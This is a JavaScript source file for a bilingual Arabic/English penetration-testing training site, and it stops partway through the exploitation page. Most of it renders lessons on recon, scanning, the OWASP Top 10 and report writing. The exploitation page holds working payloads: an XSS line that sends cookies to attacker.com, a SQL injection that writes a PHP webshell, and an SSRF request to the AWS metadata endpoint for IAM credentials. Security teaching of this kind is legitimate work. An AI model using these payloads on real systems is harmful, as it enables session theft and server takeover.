/* pages.js – دوال توليد HTML لكل قسم */
/* تُستدعى من app.js أو أي ملف آخر */

/* ========== دالة الترجمة ========== */
function txt(ar, en) {
  return (typeof currentLang !== 'undefined' && currentLang === 'en') ? en : ar;
}

/* ========== الأقسام ========== */
/* ========== الأقسام ========== */

// NOTE: pageHome() is now defined in home-page.js with new professional landing page


function pagePenTest() {
  return `
  <div class="container-fluid mt-4">
    <style>
      .pentest-hero { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 60px 40px; border-radius: 25px; text-align: center; margin-bottom: 40px; position: relative; overflow: hidden; }
      .pentest-hero h1 { font-size: 2.5rem; font-weight: 800; margin-bottom: 15px; }
      .pentest-hero p { font-size: 1.2rem; opacity: 0.9; max-width: 600px; margin: 0 auto; }
      .stats-row { display: flex; gap: 20px; justify-content: center; margin-top: 30px; flex-wrap: wrap; }
      .stat-box { background: rgba(255,255,255,0.2); padding: 20px 30px; border-radius: 15px; text-align: center; backdrop-filter: blur(5px); }
      .stat-box h3 { font-size: 2rem; font-weight: 700; margin: 0; }
      .stat-box span { font-size: 0.9rem; opacity: 0.8; }
      .level-card { background: white; border-radius: 20px; padding: 30px; margin-bottom: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.08); transition: all 0.3s ease; border-left: 5px solid; }
      .level-card:hover { transform: translateY(-5px); box-shadow: 0 8px 30px rgba(0,0,0,0.12); }
      .level-card.beginner { border-color: #28a745; }
      .level-card.intermediate { border-color: #ffc107; }
      .level-card.advanced { border-color: #dc3545; }
      .level-header { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
      .level-icon { width: 60px; height: 60px; border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: white; }
      .level-icon.beginner { background: linear-gradient(135deg, #28a745, #20c997); }
      .level-icon.intermediate { background: linear-gradient(135deg, #ffc107, #fd7e14); }
      .level-icon.advanced { background: linear-gradient(135deg, #dc3545, #e83e8c); }
      .lesson-item { display: flex; align-items: center; padding: 15px; background: #f8f9fa; border-radius: 12px; margin-bottom: 10px; cursor: pointer; transition: all 0.2s; gap: 15px; }
      .lesson-item:hover { background: #e9ecef; transform: translateX(5px); }
      .lesson-item i.icon { font-size: 1.3rem; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; background: white; border-radius: 10px; color: #667eea; }
      .lesson-item .lesson-info { flex: 1; }
      .lesson-item .lesson-title { font-weight: 600; color: #333; }
      .lesson-item .lesson-desc { font-size: 0.85rem; color: #6c757d; }
      .quick-links { display: flex; gap: 15px; flex-wrap: wrap; margin-top: 30px; justify-content: center; }
      .quick-link { padding: 15px 25px; border-radius: 50px; background: rgba(255,255,255,0.2); color: white; font-weight: 600; transition: all 0.2s; text-decoration: none; border: 2px solid rgba(255,255,255,0.3); }
      .quick-link:hover { background: white; color: #667eea; }
    </style>

    <div class="pentest-hero">
      <h1><i class="fa-solid fa-shield-halved me-3"></i>${txt('تعلم وتدرب على اختبار الاختراق', 'Learn & Practice Penetration Testing')}</h1>
      <p>${txt('رحلتك من الصفر إلى الاحتراف في أمن تطبيقات الويب', 'Journey from zero to pro in web application security')}</p>
      <div class="stats-row">
        <div class="stat-box"><h3>3</h3><span>${txt('مستويات', 'Levels')}</span></div>
        <div class="stat-box"><h3>9+</h3><span>${txt('دروس', 'Lessons')}</span></div>
        <div class="stat-box"><h3>10</h3><span>${txt('OWASP', 'OWASP')}</span></div>
        <div class="stat-box"><h3>∞</h3><span>${txt('معامل', 'Labs')}</span></div>
      </div>
      <div class="quick-links">
        <a href="#" class="quick-link" onclick="loadPage('courses')"><i class="fas fa-book me-2"></i>${txt('الكورسات', 'Courses')}</a>
        <a href="#" class="quick-link" onclick="loadPage('practice')"><i class="fas fa-door-open me-2"></i>${txt('الغرف', 'Rooms')}</a>
        <a href="#" class="quick-link" onclick="loadPage('learn')"><i class="fas fa-route me-2"></i>${txt('التعلم', 'Learn')}</a>
      </div>
    </div>

    <h2 class="mb-4"><i class="fas fa-layer-group me-2"></i>${txt('مستويات التعلم', 'Learning Levels')}</h2>

    <div class="level-card beginner">
      <div class="level-header">
        <div class="level-icon beginner"><i class="fas fa-seedling"></i></div>
        <div><h4 class="mb-0">${txt('المستوى المبتدئ', 'Beginner Level')}</h4><small class="text-muted">${txt('3-4 أسابيع', '3-4 weeks')}</small></div>
      </div>
      <div class="row g-3">
        <div class="col-md-4"><div class="lesson-item" onclick="loadPage('overview')"><i class="fas fa-network-wired icon"></i><div class="lesson-info"><div class="lesson-title">${txt('أساسيات الشبكات', 'Networking Basics')}</div><div class="lesson-desc">${txt('HTTP, TCP/IP', 'HTTP, TCP/IP')}</div></div></div></div>
        <div class="col-md-4"><div class="lesson-item" onclick="loadPage('recon')"><i class="fas fa-magnifying-glass icon"></i><div class="lesson-info"><div class="lesson-title">${txt('جمع المعلومات', 'Reconnaissance')}</div><div class="lesson-desc">${txt('OSINT, Subdomain', 'OSINT, Subdomain')}</div></div></div></div>
        <div class="col-md-4"><div class="lesson-item" onclick="loadPage('scan')"><i class="fas fa-radar icon"></i><div class="lesson-info"><div class="lesson-title">${txt('الفحص والعد', 'Scanning')}</div><div class="lesson-desc">${txt('Nmap, Nikto', 'Nmap, Nikto')}</div></div></div></div>
      </div>
    </div>

    <div class="level-card intermediate">
      <div class="level-header">
        <div class="level-icon intermediate"><i class="fas fa-fire"></i></div>
        <div><h4 class="mb-0">${txt('المستوى المتوسط', 'Intermediate Level')}</h4><small class="text-muted">${txt('4-6 أسابيع', '4-6 weeks')}</small></div>
      </div>
      <div class="row g-3">
        <div class="col-md-4"><div class="lesson-item" onclick="loadPage('vulns')"><i class="fas fa-bug icon"></i><div class="lesson-info"><div class="lesson-title">${txt('ثغرات OWASP', 'OWASP Vulns')}</div><div class="lesson-desc">${txt('SQLi, XSS, SSRF', 'SQLi, XSS, SSRF')}</div></div></div></div>
        <div class="col-md-4"><div class="lesson-item" onclick="loadPage('tools')"><i class="fas fa-toolbox icon"></i><div class="lesson-info"><div class="lesson-title">${txt('الأدوات', 'Tools')}</div><div class="lesson-desc">${txt('Burp, FFUF', 'Burp, FFUF')}</div></div></div></div>
        <div class="col-md-4"><div class="lesson-item" onclick="loadPage('exploit')"><i class="fas fa-bomb icon"></i><div class="lesson-info"><div class="lesson-title">${txt('الاستغلال', 'Exploitation')}</div><div class="lesson-desc">${txt('تنفيذ الهجمات', 'Execute attacks')}</div></div></div></div>
      </div>
    </div>

    <div class="level-card advanced">
      <div class="level-header">
        <div class="level-icon advanced"><i class="fas fa-dragon"></i></div>
        <div><h4 class="mb-0">${txt('المستوى المتقدم', 'Advanced Level')}</h4><small class="text-muted">${txt('8+ أسابيع', '8+ weeks')}</small></div>
      </div>
      <div class="row g-3">
        <div class="col-md-4"><div class="lesson-item" onclick="loadPage('post')"><i class="fas fa-ghost icon"></i><div class="lesson-info"><div class="lesson-title">${txt('ما بعد الاستغلال', 'Post-Exploitation')}</div><div class="lesson-desc">${txt('Lateral Movement', 'Lateral Movement')}</div></div></div></div>
        <div class="col-md-4"><div class="lesson-item" onclick="loadPage('report')"><i class="fas fa-file-signature icon"></i><div class="lesson-info"><div class="lesson-title">${txt('كتابة التقارير', 'Report Writing')}</div><div class="lesson-desc">${txt('تقارير احترافية', 'Professional reports')}</div></div></div></div>
        <div class="col-md-4"><div class="lesson-item" onclick="loadPage('bugbounty')"><i class="fas fa-sack-dollar icon"></i><div class="lesson-info"><div class="lesson-title">${txt('صيد الثغرات', 'Bug Bounty')}</div><div class="lesson-desc">${txt('اربح من مهاراتك', 'Earn money')}</div></div></div></div>
      </div>
    </div>

    <h2 class="mb-4 mt-5"><i class="fas fa-crosshairs me-2"></i>${txt('تحديات OWASP Top 10', 'OWASP Top 10 Challenges')}</h2>
    <div class="row g-4">${getOwaspCards()}</div>
  </div>
  `;
}


function getOwaspCards() {
  const owasp = [
    { id: 'A01', title: 'Broken Access Control', icon: 'lock-open', color: 'danger' },
    { id: 'A02', title: 'Cryptographic Failures', icon: 'key', color: 'warning' },
    { id: 'A03', title: 'Injection', icon: 'syringe', color: 'danger' },
    { id: 'A04', title: 'Insecure Design', icon: 'pencil-ruler', color: 'info' },
    { id: 'A05', title: 'Security Misconfiguration', icon: 'gears', color: 'warning' },
    { id: 'A06', title: 'Vulnerable and Outdated Components', icon: 'box-archive', color: 'secondary' },
    { id: 'A07', title: 'Identification and Authentication Failures', icon: 'id-card', color: 'dark' },
    { id: 'A08', title: 'Software and Data Integrity Failures', icon: 'code-branch', color: 'info' },
    { id: 'A09', title: 'Security Logging and Monitoring Failures', icon: 'file-waveform', color: 'primary' },
    { id: 'A10', title: 'Server-Side Request Forgery', icon: 'server', color: 'danger' }
  ];

  return owasp.map(item => `
    <div class="col-md-4 col-sm-6">
      <div class="card h-100 text-center p-3 shadow-sm border-${item.color}">
        <div class="card-body">
          <div class="display-4 text-${item.color} mb-3">
            <i class="fa-solid fa-${item.icon}"></i>
          </div>
          <h5 class="card-title">${item.id}: ${item.title}</h5>
          <div class="d-flex gap-2 justify-content-center mt-3">
            <button class="btn btn-primary btn-sm flex-grow-1" onclick="startOwaspLearn('${item.id}')">
              <i class="fa-solid fa-book-open me-1"></i> ${txt('تعلم', 'Learn')}
            </button>
            <button class="btn btn-outline-${item.color} btn-sm flex-grow-1" onclick="startOwaspPractice('${item.id}')">
              <i class="fa-solid fa-gamepad me-1"></i> ${txt('تدريب', 'Practice')}
            </button>
          </div>
        </div>
      </div>
    </div>
  `).join('');
}

// NOTE: pageDashboard() is now defined in gamification-dashboard.js with full gamification features

function pageOverview() {
  return `
    <h2> ${txt('نظرة عامة على الخطة 12 أسبوع', '12-Week Roadmap Overview')}</h2>
  <p>${txt('خطة تدريبية تدريجية تأخذك من الصفر إلى مستوى إيجاد الثغرات والإبلاغ عنها.',
    'A step-by-step plan to take you from zero to bug-bounty level.')}</p>

  <ul>
    <li>${txt('الأسبوع 1-2: أساسيات الشبكات + Recon',
      'Week 1-2: Networking basics + Recon')}</li>
    <li>${txt('الأسبوع 3-4: Scanning & Enumeration',
        'Week 3-4: Scanning & Enumeration')}</li>
    <li>${txt('الأسبوع 5-7: OWASP Top-10 (نظرية + مختبرات)',
          'Week 5-7: OWASP Top-10 (theory + labs)')}</li>
    <li>${txt('الأسبوع 8-9: Exploitation & Chaining',
            'Week 8-9: Exploitation & Chaining')}</li>
    <li>${txt('الأسبوع 10: Post-Exploitation & Reporting',
              'Week 10: Post-Exploitation & Reporting')}</li>
    <li>${txt('الأسبوع 11-12: برامج المكافآت والتقديم',
                'Week 11-12: Bug-bounty programs & submission')}</li>
  </ul>

  <button class="export" onclick="exportPDF('overview')">
    ${txt('تصدير PDF', 'Export PDF')}
  </button>
  <button class="export" onclick="download12WeekPlan()">
    ${txt('تحميل خطة 12 أسبوع (MD)', 'Download 12-week plan (MD)')}
  </button>
  <button class="export" onclick="buildStarterZip()">
    ${txt('تحميل starter-repo.zip', 'Download starter-repo.zip')}
  </button>`;
}

function sectionRecon() {
  return `
    <div class="card mb-4 shadow-sm">
    <div class="card-header bg-primary text-white">
      <h5 class="mb-0"><i class="fa-solid fa-route"></i> ${txt('Recon & OSINT Pipeline', 'Recon & OSINT Pipeline')}</h5>
    </div>
    <div class="card-body">
      <p class="text-muted">${txt('منهجية كاملة لجمع المعلومات عن الهدف باستخدام أشهر أدوات Recon.', 'Full pipeline to gather target information using the most popular Recon tools.')}</p>

      <!-- ===== Amass ===== -->
      <div class="card mb-3">
        <div class="card-body">
          <h6 class="fw-bold">Amass <small class="text-muted">(OWASP)</small></h6>
          <p class="small">${txt('يجمع النطاقات والدومينات الفرعية باستخدام مصادر متعددة.', 'Collects domains and subdomains from multiple sources.')}</p>
          ${cmdBox('amass enum -d example.com -o domains.txt')}
          <button class="btn btn-sm btn-outline-primary" onclick="showOptions('amass')">
            <i class="fa-solid fa-gear"></i> ${txt('أوبشنات', 'Options')}
          </button>
          <a href="https://github.com/owasp-amass/amass" target="_blank" class="btn btn-sm btn-outline-secondary">
            <i class="fa-brands fa-github"></i> GitHub
          </a>
        </div>
      </div>

      <!-- ===== Subfinder ===== -->
      <div class="card mb-3">
        <div class="card-body">
          <h6 class="fw-bold">Subfinder <small class="text-muted">(ProjectDiscovery)</small></h6>
          <p class="small">${txt('أداة سريعة لاستخراج الدومينات الفرعية من مصادر عامة.', 'Fast passive subdomain enumeration tool.')}</p>
          ${cmdBox('subfinder -d example.com -o subs.txt')}
          <button class="btn btn-sm btn-outline-primary" onclick="showOptions('subfinder')">
            <i class="fa-solid fa-gear"></i> ${txt('أوبشنات', 'Options')}
          </button>
          <a href="https://github.com/projectdiscovery/subfinder" target="_blank" class="btn btn-sm btn-outline-secondary">
            <i class="fa-brands fa-github"></i> GitHub
          </a>
        </div>
      </div>

      <!-- ===== Assetfinder ===== -->
      <div class="card mb-3">
        <div class="card-body">
          <h6 class="fw-bold">Assetfinder <small class="text-muted">(Tomnomnom)</small></h6>
          <p class="small">${txt('يجمع الدومينات الفرعية من مصادر متعددة بسرعة.', 'Finds subdomains passively from multiple sources.')}</p>
          ${cmdBox('assetfinder example.com')}
          <button class="btn btn-sm btn-outline-primary" onclick="showOptions('assetfinder')">
            <i class="fa-solid fa-gear"></i> ${txt('أوبشنات', 'Options')}
          </button>
          <a href="https://github.com/tomnomnom/assetfinder" target="_blank" class="btn btn-sm btn-outline-secondary">
            <i class="fa-brands fa-github"></i> GitHub
          </a>
        </div>
      </div>

      <!-- ===== crt.sh ===== -->
      <div class="card mb-3">
        <div class="card-body">
          <h6 class="fw-bold">crt.sh <small class="text-muted">(Web)</small></h6>
          <p class="small">${txt('بحث شهادات SSL لاستخراج الدومينات الفرعية.', 'Search SSL certificates to find subdomains.')}</p>
          <a href="https://crt.sh/?q=%25.example.com" target="_blank" class="btn btn-sm btn-outline-success">
            <i class="fa-solid fa-up-right-from-square"></i> ${txt('افتح الموقع', 'Open Website')}
          </a>
        </div>
      </div>
    </div>
  </div> `;
}

function pageRecon() {
  return `
    <div class="container mt-4">
    <h2>${txt('Recon & OSINT', 'Recon & OSINT')}</h2>
    <p class="legal">
      ${txt('⚠ استخدم الأدوات فقط على النطاقات التي تمتلك تصريحًا صريحًا.',
    '⚠ Only run tools on domains you own or have explicit permission to test.')}
    </p>
    
    ${sectionRecon()}

  <div class="mt-4">
    <h4>${txt('خطوات إضافية', 'Additional Steps')}</h4>
    <ul>
      <li>${txt('استخدم Wayback Machine لاسترجاع الصفحات المحفوظة:', 'Use Wayback Machine to find archived pages:')}
        <a href="https://web.archive.org" target="_blank">${txt('افتح Wayback', 'Open Wayback')}</a>
      </li>
      <li>${txt('التحقق من النطاقات النشطة باستخدام httpx:', 'Check for live domains using httpx:')}
        ${cmdBox('cat subs.txt | httpx -title -tech -o live.txt')}
      </li>
    </ul>

    <div class="alert alert-info mt-3">
      <i class="fa-solid fa-lightbulb"></i>
      ${txt('نصيحة: استخدم النتائج من أداة كمدخل للأداة التالية في السلسلة.',
      'Tip: Use the output from one tool as input for the next tool in the pipeline.')}
    </div>
  </div>
  </div> `;
}

function sectionScanning() {
  return `
    <div class="card mb-4 shadow-sm">
    <div class="card-header bg-success text-white">
      <h5 class="mb-0"><i class="fa-solid fa-magnifying-glass-plus"></i> ${txt('الفحص والعدّ', 'Scanning & Enumeration')}</h5>
    </div>
    <div class="card-body">
      <p class="text-muted">${txt('فحص المنافذ، اكتشاف الدلائل، الـ APIs، وفحص الثغرات السريعة.', 'Port scanning, directory discovery, APIs, and quick vulnerability checks.')}</p>

      <!-- ===== Nmap ===== -->
      <div class="card mb-3">
        <div class="card-body">
          <h6 class="fw-bold">Nmap <small class="text-muted">(Network Mapper)</small></h6>
          <p class="small">${txt('فحص المنافذ والخدمات والإصدارات.', 'Port, service, and version detection.')}</p>
          ${cmdBox('nmap -sV -p- -Pn target.ip', 'Avoid production boxes unless explicitly permitted')}
          <button class="btn btn-sm btn-outline-primary" onclick="showOptions('nmap')">
            <i class="fa-solid fa-gear"></i> ${txt('أوبشنات', 'Options')}
          </button>
          <a href="https://nmap.org" target="_blank" class="btn btn-sm btn-outline-secondary">
            <i class="fa-solid fa-globe"></i> ${txt('الموقع', 'Website')}
          </a>
        </div>
      </div>

      <!-- ===== FFUF ===== -->
      <div class="card mb-3">
        <div class="card-body">
          <h6 class="fw-bold">FFUF <small class="text-muted">(Fuzz Faster U Fool)</small></h6>
          <p class="small">${txt('فاز سريع للمسارات والملحقات والمعلمات.', 'Fast fuzzer for directories, extensions, and parameters.')}</p>
          ${cmdBox('ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt')}
          <button class="btn btn-sm btn-outline-primary" onclick="showOptions('ffuf')">
            <i class="fa-solid fa-gear"></i> ${txt('أوبشنات', 'Options')}
          </button>
          <a href="https://github.com/ffuf/ffuf" target="_blank" class="btn btn-sm btn-outline-secondary">
            <i class="fa-brands fa-github"></i> GitHub
          </a>
        </div>
      </div>

      <!-- ===== Gobuster ===== -->
      <div class="card mb-3">
        <div class="card-body">
          <h6 class="fw-bold">Gobuster <small class="text-muted">(Directory/DNS Fuzzer)</small></h6>
          <p class="small">${txt('فاز للدلائل أو الدومينات الفرعية.', 'Directory and DNS fuzzer.')}</p>
          ${cmdBox('gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,txt')}
          <button class="btn btn-sm btn-outline-primary" onclick="showOptions('gobuster')">
            <i class="fa-solid fa-gear"></i> ${txt('أوبشنات', 'Options')}
          </button>
          <a href="https://github.com/OJ/gobuster" target="_blank" class="btn btn-sm btn-outline-secondary">
            <i class="fa-brands fa-github"></i> GitHub
          </a>
        </div>
      </div>

      <!-- ===== Whatweb ===== -->
      <div class="card mb-3">
        <div class="card-body">
          <h6 class="fw-bold">Whatweb <small class="text-muted">(Fingerprinter)</small></h6>
          <p class="small">${txt('بصمة تقنية الويب (CMS، إطار العمل، إلخ).', 'Web technology fingerprinting (CMS, framework, etc.).')}</p>
          ${cmdBox('whatweb http://target')}
          <button class="btn btn-sm btn-outline-primary" onclick="showOptions('whatweb')">
            <i class="fa-solid fa-gear"></i> ${txt('أوبشنات', 'Options')}
          </button>
          <a href="https://github.com/urbanadventurer/WhatWeb" target="_blank" class="btn btn-sm btn-outline-secondary">
            <i class="fa-brands fa-github"></i> GitHub
          </a>
        </div>
      </div>
    </div>
  </div> `;
}

function pageScan() {
  return `
    <div class="container mt-4">
    <h2>${txt('الفحص والعدّ', 'Scanning & Enumeration')}</h2>
    <p class="legal">
      ${txt('⚠ تأكد من الحصول على إذن كتابي قبل فحص أي هدف.', '⚠ Ensure you have written permission before scanning any target.')}
    </p>
    
    ${sectionScanning()}

  <div class="mt-4">
    <h4>${txt('نصائح إضافية', 'Additional Tips')}</h4>
    <ul>
      <li>${txt('استخدم ملفات كلمات مناسبة لحجم الهدف.', 'Use appropriate wordlists based on target size.')}</li>
      <li>${txt('احتفظ بسجل منظم لنتائج الفحص.', 'Keep an organized record of scan results.')}</li>
      <li>${txt('استخدم خيارات التخفيض عند الفحص على أهداف حية.', 'Use rate limiting when scanning live targets.')}</li>
    </ul>

    <div class="alert alert-warning mt-3">
      <i class="fa-solid fa-triangle-exclamation"></i>
      ${txt('ملاحظة: بعض هذه الأدوات قد تسبب تعطيل الخدمة إذا لم تستخدم بحذر.', 'Note: Some of these tools can cause service disruption if not used carefully.')}
    </div>
  </div>
  </div> `;
}

function pageVulns() {
  return `
    <div class="container-fluid mt-4">
      <!-- Hero Section -->
      <div class="text-center mb-5" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 60px 20px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);">
        <h1 class="display-4 fw-bold mb-3">
          <i class="fa-solid fa-shield-virus me-3"></i>
          ${txt('ثغرات OWASP Top 10 - 2021', 'OWASP Top 10 Vulnerabilities - 2021')}
        </h1>
        <p class="lead mb-4" style="opacity: 0.95;">
          ${txt('القائمة الرسمية لأخطر 10 مخاطر أمنية لتطبيقات الويب. تعلم كيف تكتشفها وتستغلها.',
    'The official list of the top 10 most critical web application security risks. Learn how to detect and exploit them.')}
        </p>
        
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="d-flex justify-content-center gap-3">
                    <button class="btn btn-light btn-lg px-4 fw-bold" onclick="document.getElementById('owasp-cards').scrollIntoView({behavior: 'smooth'})">
                        <i class="fa-solid fa-gamepad me-2"></i> ${txt('ابدأ التحديات', 'Start Challenges')}
                    </button>
                    <a href="https://owasp.org/www-project-top-ten/" target="_blank" class="btn btn-outline-light btn-lg px-4">
                        <i class="fa-solid fa-external-link-alt me-2"></i> ${txt('الموقع الرسمي', 'Official Site')}
                    </a>
                </div>
            </div>
        </div>
      </div>

      <!-- Challenges Section (The key interactive part) -->
      <div id="owasp-cards" class="container">
          <div class="section-header text-center mb-5">
              <h2 class="fw-bold"><i class="fa-solid fa-crosshairs me-2"></i> ${txt('المختبر التفاعلي', 'Interactive Laboratory')}</h2>
              <p class="text-muted">${txt('اختر ثغرة للبدء: يمكنك الاختيار بين التدريب العملي (المحاكي) أو التعلم النظري.', 'Choose a vulnerability: You can choose between hands-on training (Simulator) or theoretical learning.')}</p>
          </div>
          <div class="row g-4 justify-content-center">
            ${getOwaspCards()}
          </div>
      </div>

      <hr class="my-5 featurette-divider">

      <!-- Additional Resources Section -->
      <div class="container">
        <h3><i class="fa-solid fa-book"></i> ${txt('مصادر إضافية', 'Additional Resources')}</h3>
        <p class="text-muted mb-4">${txt('روابط ومراجع خارجية للتعمق أكثر.', 'External links and references to dive deeper.')}</p>
        
        <div class="row g-4">
             ${getAdditionalResourcesCards()}
        </div>
      </div>
      
    </div>
  `;
}

function getAdditionalResourcesCards() {
  const resources = [
    { name: 'PortSwigger Academy', url: 'https://portswigger.net/web-security', icon: 'fa-graduation-cap' },
    { name: 'OWASP Testing Guide', url: 'https://owasp.org/www-project-web-security-testing-guide/', icon: 'fa-book-medical' },
    { name: 'HackTricks', url: 'https://book.hacktricks.wiki/', icon: 'fa-hat-wizard' }
  ];
  return resources.map(r => `
        <div class="col-md-4">
            <a href="${r.url}" target="_blank" class="card text-decoration-none h-100 shadow-sm hover-card">
                <div class="card-body d-flex align-items-center">
                    <div class="bg-primary bg-opacity-10 p-3 rounded-circle me-3">
                        <i class="fa-solid ${r.icon} fa-2x text-primary"></i>
                    </div>
                    <div>
                        <h5 class="mb-1 text-dark">${r.name}</h5>
                        <small class="text-muted">External Resource</small>
                    </div>
                    <i class="fa-solid fa-arrow-right ms-auto text-muted"></i>
                </div>
            </a>
        </div>
    `).join('');
}

function pageReport() {
  return `
    <div class="container mt-4">
    <h2><i class="fa-solid fa-file"></i> ${txt('كتابة التقارير الأمنية', 'Writing Security Reports')}</h2>
    <div class="alert alert-info">
      ${txt('نصائح ومعلومات حول كيفية كتابة تقارير أمان شاملة ومفيدة',
    'Tips and information on how to write comprehensive and useful security reports')}
    </div>

    <div class="row g-4">
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-primary text-white">
            <h5 class="mb-0"><i class="fa-solid fa-camera"></i> ${txt('جمع الأدلة', 'Evidence Collection')}</h5>
          </div>
          <div class="card-body">
            <ul>
              <li>${txt('التقط صوراً عالية الجودة تظهر الثغرة', 'Take high-quality screenshots showing the vulnerability')}</li>
              <li>${txt('احفظ Request/Response الكامل', 'Save full Request/Response')}</li>
              <li>${txt('انسخ cURL command لسهولة الإعادة', 'Copy cURL command for easy reproduction')}</li>
            </ul>
          </div>
        </div>
      </div>
      
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-success text-white">
            <h5 class="mb-0"><i class="fa-solid fa-pen"></i> ${txt('كتابة التقرير', 'Writing the Report')}</h5>
          </div>
          <div class="card-body">
            <ul>
              <li>${txt('أعط التقرير عنوان واضح وملخص', 'Give the report a clear title and summary')}</li>
              <li>${txt('وصف النظام المستهدف بوضوح', 'Describe the target system clearly')}</li>
              <li>${txt('وصف الثغرة بدقة', 'Describe the vulnerability in detail')}</li>
              <li>${txt('تحديد نوع الثغرة', 'Identify the type of vulnerability')}</li>
              <li>${txt('شرح كيفية الاستغلال', 'Explain how to exploit')}</li>
              <li>${txt('شرح تأثير الثغرة على النظام', 'Explain the impact of the vulnerability on the system')}</li>
              <li>${txt('تحديد مستوى خطورة الثغرة', 'Identify the severity level')}</li>
              <li>${txt('اقتراح تحسينات للتصحيح', 'Suggest fixes')}</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <div class="card mt-4">
      <div class="card-header bg-warning text-dark">
        <h5 class="mb-0"><i class="fa-solid fa-book"></i> ${txt('كتب ومراجع إضافية', 'Additional Books & References')}</h5>
      </div>
      <div class="card-body">
        <div class="row g-3">
          <div class="col-md-6">
            <div class="card h-100">
              <div class="card-body">
                <h6 class="card-title"><i class="fa-solid fa-file-pdf text-danger"></i> The Art of Deception</h6>
                <p class="card-text small text-muted">${txt('كتاب عن تقنيات التخديع في الأمن السيبراني', 'Book about deception techniques in cybersecurity')}</p>
                <a href="The_Art_of_Deception.pdf" target="_blank" class="btn btn-sm btn-outline-danger">
                  <i class="fa-solid fa-download"></i> ${txt('تحميل PDF', 'Download PDF')}
                </a>
              </div>
            </div>
          </div>
          
          <div class="col-md-6">
            <div class="card h-100">
              <div class="card-body">
                <h6 class="card-title"><i class="fa-solid fa-file-pdf text-primary"></i> Writing Security Reports</h6>
                <p class="card-text small text-muted">${txt('دليل شامل لكتابة تقارير أمان', 'Comprehensive guide to writing security reports')}</p>
                <a href="Writing_Security_Reports.pdf" target="_blank" class="btn btn-sm btn-outline-primary">
                  <i class="fa-solid fa-download"></i> ${txt('تحميل PDF', 'Download PDF')}
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div> `;
}

function pageExploit() {
  return `
    <div class="container mt-4">
    <h2><i class="fa-solid fa-bomb"></i> ${txt('الاستغلال وربط الثغرات', 'Exploitation & Chaining')}</h2>
    
    <div class="alert alert-warning">
      <i class="fa-solid fa-triangle-exclamation"></i> ${txt('تنبيه: لا تختبر على أهداف حية بدون تصريح صريح',
    'Warning: do not test live targets without explicit permission')}
    </div>

    <div class="card mb-4">
      <div class="card-header bg-primary text-white">
        <h5 class="mb-0"><i class="fa-solid fa-link"></i> ${txt('أمثلة لربط الثغرات', 'Vulnerability Chaining Examples')}</h5>
      </div>
      <div class="card-body">
        <div class="mb-4">
          <h6 class="fw-bold">1. XSS → Session Hijacking → Account Takeover</h6>
          <p class="small text-muted">${txt('سرقة جلسة المستخدم عبر XSS ثم التحكم بالحساب',
      'Steal user session via XSS then take over account')}</p>
          <ol class="small">
            <li>Find reflected XSS vulnerability</li>
            <li>Inject payload to steal cookies: <code>&lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;</code></li>
            <li>Send malicious link to victim</li>
            <li>Capture session cookie on your server</li>
            <li>Use cookie to access victim's account</li>
          </ol>
        </div>

        <div class="mb-4">
          <h6 class="fw-bold">2. CSRF → Stored XSS → Persistent Attack</h6>
          <p class="small text-muted">${txt('استخدام CSRF لحقن XSS دائم',
        'Use CSRF to inject persistent XSS')}</p>
          <ol class="small">
            <li>Find CSRF vulnerable endpoint (e.g., profile update)</li>
            <li>Create CSRF PoC that submits XSS payload</li>
            <li>Victim visits your page → CSRF executes</li>
            <li>XSS payload stored in database</li>
            <li>Every user viewing the profile gets infected</li>
          </ol>
        </div>

        <div class="mb-4">
          <h6 class="fw-bold">3. SSRF → Cloud Metadata → Privilege Escalation</h6>
          <p class="small text-muted">${txt('استخدام SSRF للوصول لبيانات السحابة الحساسة',
          'Use SSRF to access sensitive cloud metadata')}</p>
          <ol class="small">
            <li>Find SSRF vulnerability in image/URL fetcher</li>
            <li>Request AWS metadata: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
            <li>Extract IAM credentials from response</li>
            <li>Use AWS CLI with stolen credentials</li>
            <li>Escalate privileges or access other resources</li>
          </ol>
        </div>

        <div class="mb-4">
          <h6 class="fw-bold">4. SQLi → RCE via File Write</h6>
          <p class="small text-muted">${txt('تحويل SQL Injection إلى تنفيذ أوامر',
            'Turn SQL Injection into Remote Code Execution')}</p>
          <ol class="small">
            <li>Find SQL injection with write permissions</li>
            <li>Write webshell: <code>' UNION SELECT '&lt;?php system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/html/shell.php' -- </code></li>
            <li>Access webshell: <code>http://target/shell.php?cmd=whoami</code></li>
            <li>Establish reverse shell</li>
            <li>Post-exploitation activities</li>
          </ol>
        </div>

        <div>
          <h6 class="fw-bold">5. IDOR → Data Exfiltration → Lateral Movement</h6>
          <p class="small text-muted">${txt('استخدام IDOR لسرقة بيانات حساسة',
              'Use IDOR to steal sensitive data')}</p>
          <ol class="small">
            <li>Find IDOR in API endpoint: <code>/api/user/123/documents</code></li>
            <li>Enumerate all user IDs (1-10000)</li>
            <li>Download all accessible documents</li>
            <li>Find admin credentials in documents</li>
            <li>Use credentials for lateral movement</li>
          </ol>
        </div>
      </div>
    </div>

    <div class="card mb-4">
      <div class="card-header bg-success text-white">
        <h5 class="mb-0"><i class="fa-solid fa-wrench"></i> ${txt('أدوات الاستغلال', 'Exploitation Tools')}</h5>
      </div>
      <div class="card-body">
        <div class="row">
          <div class="col-md-6">
            <h6><i class="fa-solid fa-fire"></i> Burp Suite</h6>
            <ul class="small">
              <li><strong>Proxy:</strong> ${txt('اعتراض وتعديل الطلبات', 'Intercept and modify requests')}</li>
              <li><strong>Repeater:</strong> ${txt('إعادة إرسال مع تعديلات', 'Resend with modifications')}</li>
              <li><strong>Intruder:</strong> ${txt('هجمات آلية بـ Payloads', 'Automated attacks with payloads')}</li>
